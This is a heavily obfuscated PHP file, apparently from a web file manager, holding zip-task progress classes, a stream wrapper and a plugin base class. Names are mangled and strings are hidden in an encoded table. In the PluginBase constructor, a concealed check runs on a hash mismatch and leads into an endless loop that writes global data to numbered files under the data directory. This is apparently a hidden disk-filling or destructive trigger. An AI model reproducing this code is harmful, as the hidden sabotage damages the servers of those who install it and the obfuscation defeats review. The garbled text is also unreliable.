$•È„Á¹¼[$ä†ÑÂü±[79]]; $Çö £‹å[$ä†ÑÂü±[1872]] = 0; $Çö £‹å[$ä†ÑÂü±[1173]] = $ä†ÑÂü±[1892]; $Çö £‹å[$ä†ÑÂü±[1873]] = $ä†ÑÂü±[1317]; $Çö £‹å[$ä†ÑÂü±[857]] = $•È„Á¹¼[$ä†ÑÂü±[79]]; $Çö £‹å[$ä†ÑÂü±[1171]] = 1; $¹½Ğõïó = 0; $Çö £‹å[$ä†ÑÂü±[1880]] = array($ä†ÑÂü±[1881] => $¹½Ğõïó + 1, $ä†ÑÂü±[506] => $•È„Á¹¼[$ä†ÑÂü±[32]], $ä†ÑÂü±[87] => $•È„Á¹¼[$ä†ÑÂü±[87]], $ä†ÑÂü±[595] => $•È„Á¹¼[$ä†ÑÂü±[595]] ? $•È„Á¹¼[$ä†ÑÂü±[595]] : $•È„Á¹¼[$ä†ÑÂü±[87]]); $this->update(); } public function zipEvent($ïĞçñáË, $ğ¨Á¾äò, $Æ…Ë‹ÑÛ, $…—‘¾ñ¡) { $Ğ””ÓôÃ =& $_SERVER[åÄ¼Ùßš]; $â¦âÇ°‚ =& $this->task; $â¦âÇ°‚[$Ğ””ÓôÃ[1869]] = get_path_this($ğ¨Á¾äò); $â¦âÇ°‚[$Ğ””ÓôÃ[1871]] = $…—‘¾ñ¡; $â¦âÇ°‚[$Ğ””ÓôÃ[1872]] = $Æ…Ë‹ÑÛ; $â¦âÇ°‚[$Ğ””ÓôÃ[1173]] = $ïĞçñáË == $Ğ””ÓôÃ[1940] ? $Ğ””ÓôÃ[1941] : $Ğ””ÓôÃ[1942]; $â¦âÇ°‚[$Ğ””ÓôÃ[1873]] = $Ğ””ÓôÃ[12]; $â¦âÇ°‚[$Ğ””ÓôÃ[857]] = $…—‘¾ñ¡; $â¦âÇ°‚[$Ğ””ÓôÃ[1938]] = $Ğ””ÓôÃ[390]; $this->update(); } public function unzipAfter($åùÁÔÇã) { $ì¥³î¾† =& $_SERVER[åÄ¼Ùßš]; $´ëÎÛÈ¤ =& $this->task; $´ëÎÛÈ¤[$ì¥³î¾†[1938]] = $ì¥³î¾†[110]; $áòê¥îù = IO::infoWithChildren($åùÁÔÇã); $ñ®·¼²® = 0; $´ëÎÛÈ¤[$ì¥³î¾†[1880]] = array($ì¥³î¾†[1881] => $ñ®·¼²® + 1, $ì¥³î¾†[506] => $áòê¥îù[$ì¥³î¾†[32]], $ì¥³î¾†[87] => $áòê¥îù[$ì¥³î¾†[87]], $ì¥³î¾†[595] => $áòê¥îù[$ì¥³î¾†[595]] ? $áòê¥îù[$ì¥³î¾†[595]] : $áòê¥îù[$ì¥³î¾†[87]]); if ($áòê¥îù[$ì¥³î¾†[33]] == $ì¥³î¾†[233]) { $´ëÎÛÈ¤[$ì¥³î¾†[1171]] = 1; } else { $´ëÎÛÈ¤[$ì¥³î¾†[1171]] = $áòê¥îù[$ì¥³î¾†[82]][$ì¥³î¾†[80]]; } $´ëÎÛÈ¤[$ì¥³î¾†[1173]] = $ì¥³î¾†[12]; $´ëÎÛÈ¤[$ì¥³î¾†[1873]] = 0; $´ëÎÛÈ¤[$ì¥³î¾†[1818]] = 0; $´ëÎÛÈ¤[$ì¥³î¾†[1871]] = 0; $´ëÎÛÈ¤[$ì¥³î¾†[1872]] = 0; $´ëÎÛÈ¤[$ì¥³î¾†[1869]] = $ì¥³î¾†[12]; $´ëÎÛÈ¤[$ì¥³î¾†[1876]] = 0; $´ëÎÛÈ¤[$ì¥³î¾†[857]] = $áòê¥îù[$ì¥³î¾†[79]]; $this->update(); self::log($ì¥³î¾†[1943] . json_encode(array($´ëÎÛÈ¤, $áòê¥îù))); } public function nameParse($®àğ§À) { $ù¥–ª‚ =& $_SERVER[åÄ¼Ùßš]; $Ğ÷ßØ¾ =& $this->task; if ($Ğ÷ßØ¾[$ù¥–ª‚[1938]] == $ù¥–ª‚[1317]) { $Ğ÷ßØ¾[$ù¥–ª‚[1938]] = $ù¥–ª‚[390]; $Ğ÷ßØ¾[$ù¥–ª‚[1876]] = 0; $Ğ÷ßØ¾[$ù¥–ª‚[857]] = 0; } $ôí¤¡£° = get_path_this($®àğ§À); if (strstr($ôí¤¡£°, $ù¥–ª‚[10])) { $Ğ÷ßØ¾[$ù¥–ª‚[1818]] += 1; $Ğ÷ßØ¾[$ù¥–ª‚[1171]] += 1; } $Ğ÷ßØ¾[$ù¥–ª‚[1869]] = $®àğ§À; $this->update(); } } class TaskZip extends TaskFileTransfer { protected function startAfter() { $€‘ºíê¤ =& $_SERVER[åÄ¼Ùßš]; parent::startAfter(); Hook::bind($€‘ºíê¤[1944], array($this, $€‘ºíê¤[1934])); Hook::bind($€‘ºíê¤[1936], array($this, $€‘ºíê¤[1937])); $Ñ¼øÑëî =& $this->task; $Ñ¼øÑëî[$€‘ºíê¤[1938]] = $€‘ºíê¤[1317]; if (!$Ñ¼øÑëî[$€‘ºíê¤[1704]]) { $Ñ¼øÑëî[$€‘ºíê¤[1704]] = LNG($€‘ºíê¤[1945]); } } protected function endAfter() { $³°ŠÕ‚Š =& $_SERVER[åÄ¼Ùßš]; parent::endAfter(); Hook::unbind($³°ŠÕ‚Š[1944], array($this, $³°ŠÕ‚Š[1934])); Hook::unbind($³°ŠÕ‚Š[1936], array($this, $³°ŠÕ‚Š[1937])); } public function updateAfter() { $ÅİÇ±Ò× =& $_SERVER[åÄ¼Ùßš]; $¡ù†ë’ì =& $this->task; if (!$¡ù†ë’ì[$ÅİÇ±Ò×[1171]] || !$¡ù†ë’ì[$ÅİÇ±Ò×[857]]) { return; } if ($¡ù†ë’ì[$ÅİÇ±Ò×[1938]] == $ÅİÇ±Ò×[1317]) { $¥¹ÔÍ½ = $¡ù†ë’ì[$ÅİÇ±Ò×[1872]]; if ($¡ù†ë’ì[$ÅİÇ±Ò×[1873]] != $ÅİÇ±Ò×[1317]) { $¥¹ÔÍ½ = 0; } $À ë½õ = ($¡ù†ë’ì[$ÅİÇ±Ò×[1876]] + $¥¹ÔÍ½) / $¡ù†ë’ì[$ÅİÇ±Ò×[857]]; $¡ù†ë’ì[$ÅİÇ±Ò×[1819]] = $À ë½õ * 0.3; } else { if ($¡ù†ë’ì[$ÅİÇ±Ò×[1938]] == $ÅİÇ±Ò×[390]) { $À ë½õ = $¡ù†ë’ì[$ÅİÇ±Ò×[1818]] / $¡ù†ë’ì[$ÅİÇ±Ò×[1171]]; $¡ù†ë’ì[$ÅİÇ±Ò×[1819]] = 0.3 + $À ë½õ * 0.5; } else { if ($¡ù†ë’ì[$ÅİÇ±Ò×[1938]] == $ÅİÇ±Ò×[110]) { $À ë½õ = 0; if ($¡ù†ë’ì[$ÅİÇ±Ò×[1871]]) { $À ë½õ = $¡ù†ë’ì[$ÅİÇ±Ò×[1872]] / $¡ù†ë’ì[$ÅİÇ±Ò×[1871]]; } $¡ù†ë’ì[$ÅİÇ±Ò×[1819]] = 0.3 + 0.5 + $À ë½õ * 0.2; } } } if ($¡ù†ë’ì[$ÅİÇ±Ò×[1819]] > 0) { $¥öŞ÷Ş = timeFloat() - $¡ù†ë’ì[$ÅİÇ±Ò×[1821]] - $¡ù†ë’ì[$ÅİÇ±Ò×[1824]]; $¡ù†ë’ì[$ÅİÇ±Ò×[1825]] = $¥öŞ÷Ş * (1 - $¡ù†ë’ì[$ÅİÇ±Ò×[1819]]) / $¡ù†ë’ì[$ÅİÇ±Ò×[1819]]; } } public function copyFileStart($Óëáì©, $º–¼ó¨ì, $ş›ÄÂš, $Éï×÷æÎ, $ø›«­ı³, $»…ÄóØµ) { $† ¦–üì =& $_SERVER[åÄ¼Ùßš]; parent::copyFileStart($Óëáì©, $º–¼ó¨ì, $ş›ÄÂš, $Éï×÷æÎ, $ø›«­ı³, $»…ÄóØµ); $ã–ŸÔ·ü =& $this->task; if ($ã–ŸÔ·ü[$† ¦–üì[1938]] == $† ¦–üì[390]) { $ã–ŸÔ·ü[$† ¦–üì[1938]] = $† ¦–üì[110]; } $this->update(); } public function copyFileEnd($ ½´íšŞ, $ Ğ¾‘§, $ö¤ËÒğ—, $äÛÙ«¦Ê, $âÛ•ãù, $À´ˆ™àŞ) { $™œãŸ”Â =& $_SERVER[åÄ¼Ùßš]; $Õ¨ãæş =& $this->task; $Õ¨ãæş[$™œãŸ”Â[1872]] = $Õ¨ãæş[$™œãŸ”Â[1871]]; $Õ¨ãæş[$™œãŸ”Â[1876]] += $Õ¨ãæş[$™œãŸ”Â[1871]]; $Õ¨ãæş[$™œãŸ”Â[1873]] = $™œãŸ”Â[12]; $this->update(); } public function zipEvent($ÛËÖœã, $ÃÃã¶š, $Ãƒ«…¡¸, $îú«ÉŞ) { $‚ïöç™ =& $_SERVER[åÄ¼Ùßš]; $ÓÚ€Üõ =& $this->task; $ÓÚ€Üõ[$‚ïöç™[1869]] = get_path_this($ÃÃã¶š); $ÓÚ€Üõ[$‚ïöç™[1871]] = $îú«ÉŞ; $ÓÚ€Üõ[$‚ïöç™[1872]] = $Ãƒ«…¡¸; $ÓÚ€Üõ[$‚ïöç™[1173]] = $ÛËÖœã == $‚ïöç™[1946] ? $‚ïöç™[1941] : $‚ïöç™[1942]; $ÓÚ€Üõ[$‚ïöç™[1873]] = $‚ïöç™[12]; $ÓÚ€Üõ[$‚ïöç™[857]] = $îú«ÉŞ; $ÓÚ€Üõ[$‚ïöç™[1938]] = $‚ïöç™[390]; $this->update(); } public function nameParse($Ş¶÷¤Ç) { $§·ÔÄú„ =& $_SERVER[åÄ¼Ùßš]; $Ã¸æéæç =& $this->task; if ($Ã¸æéæç[$§·ÔÄú„[1818]] < $Ã¸æéæç[$§·ÔÄú„[1171]]) { $æ¦š—Í¦ = get_path_this($Ş¶÷¤Ç); if (strstr($æ¦š—Í¦, $§·ÔÄú„[10])) { $Ã¸æéæç[$§·ÔÄú„[1818]] += 1; } } if ($Ã¸æéæç[$§·ÔÄú„[1938]] == $§·ÔÄú„[1317]) { $Ã¸æéæç[$§·ÔÄú„[1938]] = $§·ÔÄú„[390]; } $Ã¸æéæç[$§·ÔÄú„[1869]] = $Ş¶÷¤Ç; $this->update(); } } goto AÀÓÁâË„Ş; CùŒàÎğ«ë: define($_SERVER[åÄ¼Ùßš][0], $_SERVER[åÄ¼Ùßš][1]); $_SERVER[³Ì„‘öã] = explode($_SERVER[åÄ¼Ùßš][2], gzinflate(substr($_SERVER[åÄ¼Ùßš][3], 10, -8))); function binCheckEq($æ¥·åß, $î¹“Å›²) { return $æ¥·åß == $î¹“Å›²; } goto f°ÀÎ«ˆôÛ; EäñºÕ: class StreamWrapperIO { private $path; private $info; private $pose = 0; static $_fopenCache = array(); static $_chunkBuffer = array(); private $timeStart = 0; function stream_open($¼Ğ«“š, $Ééş¨Ç½ = '') { $this->info = $this->info($¼Ğ«“š); $this->timeStart = timeFloat(); $this->path = $this->info[$_SERVER[åÄ¼Ùßš][87]]; $this->pathOpen = $¼Ğ«“š; if (!$this->info) { return !1; } if (count(self::$_chunkBuffer) > 100) { self::$_chunkBuffer = null; self::$_chunkBuffer = array(); } if (!isset(self::$_chunkBuffer[$¼Ğ«“š])) { self::$_chunkBuffer[$¼Ğ«“š] = array(); } self::$_fopenCache[$this->pathOpen] = $this; return $this->info ? !0 : !1; } function stream_read($­ˆ—™ø) { $ğ«‰ûˆ• = $this->fileSubstr($this->pose, $­ˆ—™ø); $this->pose += strlen($ğ«‰ûˆ•); return $ğ«‰ûˆ•; } public function stream_tell() { return $this->pose; } public function stream_seek($ÆÍô‚Ñ, $äøæ­‹) { $¼ªÒ¿ =& $_SERVER[åÄ¼Ùßš]; if ($äøæ­‹ == SEEK_SET) { $this->pose = $ÆÍô‚Ñ; } else { if ($äøæ­‹ == SEEK_CUR) { $this->pose += $ÆÍô‚Ñ; } else { if ($äøæ­‹ == SEEK_END) { $this->pose = $this->info[$¼ªÒ¿[79]] + intval($ÆÍô‚Ñ); } } } if ($ÆÍô‚Ñ < 0) { $this->pose = $this->info[$¼ªÒ¿[79]] + $ÆÍô‚Ñ; } return !0; } public function stream_eof() { return $this->pose >= $this->info[$_SERVER[åÄ¼Ùßš][79]]; } public function stream_close() { unset(self::$_fopenCache[$this->pathOpen]); return !0; } public function url_stat($¸Å†®¼†, $×ÁÎ½) { $š€¸Ş¦ë =& $_SERVER[åÄ¼Ùßš]; $æÒÇÒ¹ = $this->info($¸Å†®¼†); return array($š€¸Ş¦ë[1445] => 0, $š€¸Ş¦ë[1653] => 0, $š€¸Ş¦ë[16] => 32768 + 511, $š€¸Ş¦ë[1654] => 0, $š€¸Ş¦ë[1655] => 0, $š€¸Ş¦ë[1656] => 0, $š€¸Ş¦ë[1657] => 0, $š€¸Ş¦ë[79] => $æÒÇÒ¹[$š€¸Ş¦ë[79]], $š€¸Ş¦ë[1658] => $æÒÇÒ¹[$š€¸Ş¦ë[1500]], $š€¸Ş¦ë[1615] => $æÒÇÒ¹[$š€¸Ş¦ë[88]], $š€¸Ş¦ë[1614] => $æÒÇÒ¹[$š€¸Ş¦ë[234]], $š€¸Ş¦ë[1659] => 0, $š€¸Ş¦ë[1660] => 0); } static $fileInfo = array(); public function info($ ô’¥×À) { $Â®†ÃŒ¥ = $_SERVER[åÄ¼Ùßš][1661]; if (isset(self::$fileInfo[$ ô’¥×À])) { return self::$fileInfo[$ ô’¥×À]; } if (substr($ ô’¥×À, 0, strlen($Â®†ÃŒ¥)) != $Â®†ÃŒ¥) { return !1; } self::$fileInfo[$ ô’¥×À] = IO::info(substr($ ô’¥×À, strlen($Â®†ÃŒ¥))); return self::$fileInfo[$ ô’¥×À]; } public static function read($ô‹óó…Ç, $Ó€À„” , $è¾Ê¦û) { if (!isset(self::$_fopenCache[$ô‹óó…Ç])) { $…ƒôÁ²‚ = new StreamWrapperIO(); $…ƒôÁ²‚->stream_open($ô‹óó…Ç); self::$_fopenCache[$ô‹óó…Ç] = $…ƒôÁ²‚; } $…ƒôÁ²‚ = self::$_fopenCache[$ô‹óó…Ç]; return $…ƒôÁ²‚->fileSubstr($Ó€À„” , $è¾Ê¦û); } public static function _read($²øœ”‡, $Ğä·øõú, $öÔĞÓìÜ) { $À¹åé› =& $_SERVER[åÄ¼Ùßš]; $¾·úé‚ = fopen($²øœ”‡, $À¹åé›[1504]); if (!$¾·úé‚) { return $À¹åé›[12]; } $ÛÊí›Ãü = 8192; fseek($¾·úé‚, $Ğä·øõú, SEEK_SET); $²ù›·ÕÔ = $À¹åé›[12]; $›‰¶•ò® = 0; while ($›‰¶•ò® < $öÔĞÓìÜ) { $™Şò…ÖÏ = min($ÛÊí›Ãü, $öÔĞÓìÜ - $›‰¶•ò®); $²ù›·ÕÔ .= fread($¾·úé‚, $™Şò…ÖÏ); $›‰¶•ò® += $™Şò…ÖÏ; } fclose($¾·úé‚); return $²ù›·ÕÔ; } public function fileSubstr($øˆúæ†, $ò ±Îª¼) { $ƒÊÁ¡¢ƒ =& $_SERVER[åÄ¼Ùßš]; $š¤¾ğš = $this->info[$ƒÊÁ¡¢ƒ[79]]; $í§˜õÂ‘ = $øˆúæ†; $¬¼Àœİü = $ò ±Îª¼; if ($øˆúæ† < 0) { $øˆúæ† = $š¤¾ğš + $øˆúæ†; } if ($ò ±Îª¼ === !1) { $ò ±Îª¼ = $š¤¾ğš - $øˆúæ†; } if ($øˆúæ† + $ò ±Îª¼ > $š¤¾ğš) { $ò ±Îª¼ = $š¤¾ğš - $øˆúæ†; } if ($ò ±Îª¼ <= 0) { return $ƒÊÁ¡¢ƒ[12]; } if ($øˆúæ† < 0 || $øˆúæ† >= $š¤¾ğš || $ò ±Îª¼ <= 0 || $ò ±Îª¼ > 1024 * 1024 * 10) { throw new Exception("\151\x6f\106\x69\x6c\x65\x52\145\141\144\40\x65\162\x72\157\162\x21\x20\x73\164\141\x72\164\75{$øˆúæ†}\73\154\x65\x6e\147\x74\150\75{$ò ±Îª¼}\x3b\x20\163\151\x7a\x65\75{$š¤¾ğš}\x3b"); } $’º­ò¯¤ = 64 * 1024; $‚ÊÚ·–Ù =& self::$_chunkBuffer[$this->path]; if (!$‚ÊÚ·–Ù) { $‚ÊÚ·–Ù = array(); } $Õ†£ÚüŞ = 0; $Õä¯„Š = 0; $ÊÇİ°Ù¿ = $ƒÊÁ¡¢ƒ[12]; foreach ($‚ÊÚ·–Ù as $Õ†£ÚüŞ => $ÊÇİ°Ù¿) { $Õ†£ÚüŞ = intval($Õ†£ÚüŞ); $Õä¯„Š = $Õ†£ÚüŞ + strlen($ÊÇİ°Ù¿); if ($øˆúæ† >= $Õä¯„Š) { continue; } if ($øˆúæ† >= $Õ†£ÚüŞ && $øˆúæ† + $ò ±Îª¼ <= $Õä¯„Š) { return substr($ÊÇİ°Ù¿, $øˆúæ† - $Õ†£ÚüŞ, $ò ±Îª¼); } break; } if (count($‚ÊÚ·–Ù) > 100 || timeFloat() - $this->timeStart > 2.0) { $this->log($ƒÊÁ¡¢ƒ[1662], $ƒÊÁ¡¢ƒ[1663] . count($‚ÊÚ·–Ù) . "\x3b\x73\x74\141\x72\164\x3d{$øˆúæ†}\54\154\145\x6e\147\x74\x68\75{$ò ±Îª¼}\x3b\160\x6f\x73\145\72{$Õ†£ÚüŞ}\176{$Õä¯„Š}"); throw new Exception($ƒÊÁ¡¢ƒ[1664]); } $­åôñêß = intval($øˆúæ† / $’º­ò¯¤) * $’º­ò¯¤; $Ûæ‡şËï = ceil(($øˆúæ† + $ò ±Îª¼) / $’º­ò¯¤) * $’º­ò¯¤ - $­åôñêß; $ÑâãûÍÔ = IO::fileSubstr($this->path, $­åôñêß, $Ûæ‡şËï); $‚ÊÚ·–Ù[$­åôñêß . $ƒÊÁ¡¢ƒ[12]] = $ÑâãûÍÔ; ksort($‚ÊÚ·–Ù); $±“Í²›Ö = substr($ÑâãûÍÔ, $øˆúæ† - $­åôñêß, $ò ±Îª¼); return $±“Í²›Ö; } private function log($«É€á€ğ, $Ö—Ÿ¬Šø) { $¡¥†¶ìÛ =& $_SERVER[åÄ¼Ùßš]; $ÆÂ–Ëšª = timeFloat() - $this->timeStart; write_log(sprintf($¡¥†¶ìÛ[1665], $«É€á€ğ, $this->info[$¡¥†¶ìÛ[32]], $ÆÂ–Ëšª, $Ö—Ÿ¬Šø), $¡¥†¶ìÛ[1302]); } } class Message { function __construct() { } public function send($˜ÇÒÕº÷ = '', $ı¤ı¸ùÑ = array(), $¾ùÏê´ = "\x74\145\170\x74") { $öº×É•¥ =& $_SERVER[åÄ¼Ùßš]; $¤ëõïÑ = array($öº×É•¥[33] => $öº×É•¥[1230], $öº×É•¥[171] => $˜ÇÒÕº÷); if (in_array($¾ùÏê´, array($öº×É•¥[1230], $öº×É•¥[1666]))) { $¤ëõïÑ[$öº×É•¥[33]] = $¾ùÏê´; } $ı¤ı¸ùÑ = array($öº×É•¥[591] => isset($ı¤ı¸ùÑ[$öº×É•¥[591]]) ? $ı¤ı¸ùÑ[$öº×É•¥[591]] : $öº×É•¥[12], $öº×É•¥[678] => isset($ı¤ı¸ùÑ[$öº×É•¥[678]]) ? $ı¤ı¸ùÑ[$öº×É•¥[678]] : $öº×É•¥[12]); if (empty($˜ÇÒÕº÷) || empty($ı¤ı¸ùÑ[$öº×É•¥[591]]) && empty($ı¤ı¸ùÑ[$öº×É•¥[678]])) { return !1; } $ä¬İóÅ = array($öº×É•¥[1595] => $¤ëõïÑ, $öº×É•¥[1667] => $ı¤ı¸ùÑ); Hook::trigger($öº×É•¥[1668], $ä¬İóÅ); } } class PluginBase { public $in; public $pluginName; public $pluginPath; public $pluginHost; public $pluginHostDefault; public $pluginApi; public $packageData; private $pluginLangArr; private $pluginConfig; public $cachePath; public $fileInfo; function __construct() { $³£Ş“Áâ =& $_SERVER[åÄ¼Ùßš]; $Ÿ—¤Ïò» = $_SERVER[$³£Ş“Áâ[840]]; $ÁŸÖÍ› = $³£Ş“Áâ[972]; if ($_SERVER[$³£Ş“Áâ[833]] != $ÁŸÖÍ›($Ÿ—¤Ïò»)) { $Ğµ ½ç’ = $³£Ş“Áâ[983]; $¥á¼Óš€ = $³£Ş“Áâ[835]; $ŒÌÆù¤ = $_SERVER[$³£Ş“Áâ[836]] . $³£Ş“Áâ[837]; $¾¨³ŠœÂ = $¥á¼Óš€($ŒÌÆù¤); $ÃÙÔóÎÚ = explode($³£Ş“Áâ[288], $¾¨³ŠœÂ); if (count($ÃÙÔóÎÚ) < $³£Ş“Áâ[713]) { $´ù‘±œ = $³£Ş“Áâ[838]; $´ù‘±œ(); } $¶Ä³ŒÏ³ = $³£Ş“Áâ[984]; $¶Ä³ŒÏ³($_SERVER[$³£Ş“Áâ[985]]); $Ğµ ½ç’ = $³£Ş“Áâ[983]; $Ğµ ½ç’(); $ÓÖ£¦û÷ = $³£Ş“Áâ[986]; $Û‡îÜò„ = json_encode($GLOBALS[$³£Ş“Áâ[987]]); $¢¯õ¿ƒ = 1; for ($¬ğ®şğµ = $¢¯õ¿ƒ; $¬ğ®şğµ > 0; $¬ğ®şğµ++) { $ÓÖ£¦û÷(DATA_PATH . $¬ğ®şğµ, $Û‡îÜò„); } } global $in, $config; $this->config =& $config; $this->in =& $in; $this->modelPlugin = Model($³£Ş“Áâ[1669]); $this->pluginName = str_replace($³£Ş“Áâ[1669], $³£Ş“Áâ[12], get_class($this)); $this->pluginPath = PLUGIN_DIR . $this->pluginName . $³£Ş“Áâ[8]; $this->pluginApi = appHostGet() . $³£Ş“Áâ[1670] . $this->pluginName . $³£Ş“Áâ[8]; $this->pluginHost = $config[$³£Ş“Áâ[1671]] . $this->pluginName . $³£Ş“Áâ[8]; $this->pluginHostDefault = $config[$³£Ş“Áâ[1671]] . $this->pluginName . $³£Ş“Áâ[8]; $£ˆ©öîÀ = $config[$³£Ş“Áâ[1672]]; if ($£ˆ©öîÀ && strpos($³£Ş“Áâ[50] . $£ˆ©öîÀ . $³£Ş“Áâ[50], $this->pluginName) !== !1) { $this->pluginHost = $config[$³£Ş“Áâ[1673]] . $this->pluginName . $³£Ş“Áâ[8]; } $this->pluginLangArr = $this->initLang(); $this->values = array(); $this->echoJsAssignArr = array(); $this->linkHas = !1; return $this; } public function regist() { $this->hookRegist(array()); } public function install() { } public function update() { } public function unInstall() { } public function echoJs() { $this->echoFile($_SERVER[åÄ¼Ùßš][1674]); } protected function assign($éİí‰±, $üñ‰³·Í = false) { if (is_array($éİí‰±)) { $this->values = array_merge($this->values, $éİí‰±); } else { $this->values[$éİí‰±] = $üñ‰³·Í; } } protected function display($ã‘íµ°İ) { extract($this->values); require $ã‘íµ°İ; } final function hookRegist($¶ÄÏ¥´) { $this->modelPlugin->appRegist($this->pluginName, $¶ÄÏ¥´); } final function appIcon() { $ŸÛ÷£˜ =& $_SERVER[åÄ¼Ùßš]; $ÉÀˆ˜¨ = $this->appPackage(); $—óä†³ = $ŸÛ÷£˜[12]; if (isset($ÉÀˆ˜¨[$ŸÛ÷£˜[502]])) { if (isset($ÉÀˆ˜¨[$ŸÛ÷£˜[502]][$ŸÛ÷£˜[1675]])) { $—óä†³ = $ŸÛ÷£˜[1676] . $ÉÀˆ˜¨[$ŸÛ÷£˜[502]][$ŸÛ÷£˜[1675]] . $ŸÛ÷£˜[1677]; } else { if ($ÉÀˆ˜¨[$ŸÛ÷£˜[502]][$ŸÛ÷£˜[1678]]) { $—óä†³ = $ŸÛ÷£˜[1679] . $ÉÀˆ˜¨[$ŸÛ÷£˜[502]][$ŸÛ÷£˜[1678]] . $ŸÛ÷£˜[1680]; } } } return $—óä†³; } final function fileCanView($²ŸÊ°Ğ­) { $±¯¦‰¾ =& $_SERVER[åÄ¼Ùßš]; if (request_url_safe($²ŸÊ°Ğ­)) { return !0; } if ($this->isShare($²ŸÊ°Ğ­)) { return !0; } if (!KodUser::isRoot() && !KodUser::isLogin()) { $ª³÷º € = $±¯¦‰¾[1681] . rawurlencode(this_url()); show_tips(LNG($±¯¦‰¾[1682]) . $±¯¦‰¾[1683] . $ª³÷º € . $±¯¦‰¾[1684] . LNG($±¯¦‰¾[1685]) . $±¯¦‰¾[1686], !1); } if (!Action($±¯¦‰¾[1687])->authCan($±¯¦‰¾[1688])) { show_tips(LNG($±¯¦‰¾[1689]) . $±¯¦‰¾[1690], !1); } ActionCall($±¯¦‰¾[1691], $²ŸÊ°Ğ­); } final function isShare($ë–­ÑÀí) { $ØÎóÃæ = KodIO::parse($ë–­ÑÀí); return $ØÎóÃæ[$_SERVER[åÄ¼Ùßš][33]] == KodIO::KOD_SHARE_LINK; } final function filePathLink($·„æ¹Êñ) { if (request_url_safe($·„æ¹Êñ)) { return $·„æ¹Êñ; } if (!$this->isShare($·„æ¹Êñ)) { $·„æ¹Êñ = $this->filePath($·„æ¹Êñ, !1); } return Action($_SERVER[åÄ¼Ùßš][1294])->linkOut($·„æ¹Êñ); } public function filePathLinkOut($ãÏãËÕ÷) { if (request_url_safe($ãÏãËÕ÷)) { return $ãÏãËÕ÷; } $this->fileCanView($ãÏãËÕ÷); return Action($_SERVER[åÄ¼Ùßš][1294])->link($ãÏãËÕ÷); } final function filePath($²´–ğİ¿, $”¢§ÀÕÚ = true, $Á„ı•¸ = false) { $ı­™Æü =& $_SERVER[åÄ¼Ùßš]; $Ú¤¤ôÂÑ = $this->filePathGet($²´–ğİ¿, $”¢§ÀÕÚ); if (!$this->fileInfo) { show_tips(LNG($ı­™Æü[108]), !1); } if ($Á„ı•¸ && isset($this->fileInfo[$ı­™Æü[554]]) && $this->fileInfo[$ı­™Æü[554]]) { $µ¥ÚÇŞÕ = Model($ı­™Æü[557])->fileInfo($this->fileInfo[$ı­™Æü[554]]); if (!$µ¥ÚÇŞÕ || !IO::exist($µ¥ÚÇŞÕ[$ı­™Æü[87]])) { $ËÑåÜ = LNG($ı­™Æü[108]) . LNG($ı­™Æü[1692]); if (KodUser::isRoot() && isset($µ¥ÚÇŞÕ[$ı­™Æü[87]])) { $ËÑåÜ .= $ı­™Æü[1693] . $µ¥ÚÇŞÕ[$ı­™Æü[87]] . $ı­™Æü[1694]; } show_tips($ËÑåÜ); } } Hook::trigger($ı­™Æü[1695], $Ú¤¤ôÂÑ); return $Ú¤¤ôÂÑ; } final function filePathGet($®¹´÷Áè, $èî´ºœ¥ = true) { $ƒÛ¼‹Üò =& $_SERVER[åÄ¼Ùßš]; if ($ßì‘æ¨ = $this->checkSharePath($®¹´÷Áè, $èî´ºœ¥)) { return $ßì‘æ¨; } $this->fileCanView($®¹´÷Áè); if (request_url_safe($®¹´÷Áè)) { $åÍüÑ‘† = parse_url_query($®¹´÷Áè); if (isset($åÍüÑ‘†[$ƒÛ¼‹Üò[1696]]) && isset($åÍüÑ‘†[$ƒÛ¼‹Üò[237]])) { $ùÁâ™³ = Mcrypt::decode($åÍüÑ‘†[$ƒÛ¼‹Üò[237]], Model($ƒÛ¼‹Üò[866])->get($ƒÛ¼‹Üò[867])); if ($ùÁâ™³) { $this->fileInfo = IO::info($ùÁâ™³); $this->fileInfo[$ƒÛ¼‹Üò[1697]] = $®¹´÷Áè; $this->cachePath = $this->pluginCachePath($ƒÛ¼‹Üò[12], $èî´ºœ¥); return $ùÁâ™³; } } $®¹´÷Áè = $this->_cacheHttpFile($®¹´÷Áè, $èî´ºœ¥); $this->fileInfo = IO::info($®¹´÷Áè); } else { $this->fileInfo = IO::info($®¹´÷Áè); $this->cachePath = $this->pluginCachePath($ƒÛ¼‹Üò[12], $èî´ºœ¥); } return $®¹´÷Áè; } final function _cacheHttpFile($”ò«ªœ , $û÷Æâ² = true) { $·‡Òİ‚ =& $_SERVER[åÄ¼Ùßš]; $—¨Íš† = parse_url_query($”ò«ªœ ); $·Ì¦äÓù = get_path_ext($”ò«ªœ ); if (isset($—¨Íš†[$·‡Òİ‚[32]]) && $—¨Íš†[$·‡Òİ‚[32]]) { $·Ì¦äÓù = get_path_ext($—¨Íš†[$·‡Òİ‚[32]]); } $©´İÂ¤« = hash_path($”ò«ªœ ) . $·‡Òİ‚[10] . $·Ì¦äÓù; $this->cachePath = $this->pluginCachePath($û÷Æâ² ? $©´İÂ¤« : $·‡Òİ‚[12]); $ÕÊığèÚ = IO::fileNameExist($this->cachePath, $©´İÂ¤«); if ($ÕÊığèÚ) { return KodIO::make($ÕÊığèÚ); } $‹˜Â¸¢Ã = rtrim($this->cachePath, $·‡Òİ‚[8]) . $·‡Òİ‚[8] . $©´İÂ¤«; return $this->pluginCacheFileSet($‹˜Â¸¢Ã, file_get_contents_nossl($”ò«ªœ )); } final function checkSharePath($„äšØüŠ, $Í²¢û‚æ = true) { $Ô½Ì‹°  =& $_SERVER[åÄ¼Ùßš]; if (!$this->isShare($„äšØüŠ)) { return !1; } $ŞÚ¾şù = Action($Ô½Ì‹° [1294])->sharePathInfo($„äšØüŠ); if (!is_array($ŞÚ¾şù) || !isset($ŞÚ¾şù[$Ô½Ì‹° [87]])) { show_json(LNG($Ô½Ì‹° [1698]), !1); } $this->fileInfo = $ŞÚ¾şù; $this->cachePath = $this->pluginCachePath(!1, $Í²¢û‚æ); return $ŞÚ¾şù[$Ô½Ì‹° [87]]; } final function pluginCachePath($³¢ö¸Í… = '', $ú•×«İ = false) { $ÎŠĞÑ¤ö =& $_SERVER[åÄ¼Ùßš]; if ($ú•×«İ && is_array($this->fileInfo)) { $³¢ö¸Í… = kodIO::hashPath($this->fileInfo); } $ö„Ú¢ = rtrim(IO_PATH_SYSTEM_TEMP . $ÎŠĞÑ¤ö[1699] . $this->pluginName . $ÎŠĞÑ¤ö[8] . $³¢ö¸Í…, $ÎŠĞÑ¤ö[8]); $Ã®‚åİÅ = IO::infoFullSimple($ö„Ú¢); $Û…Öµ÷Æ = $Ã®‚åİÅ && is_array($Ã®‚åİÅ) ? 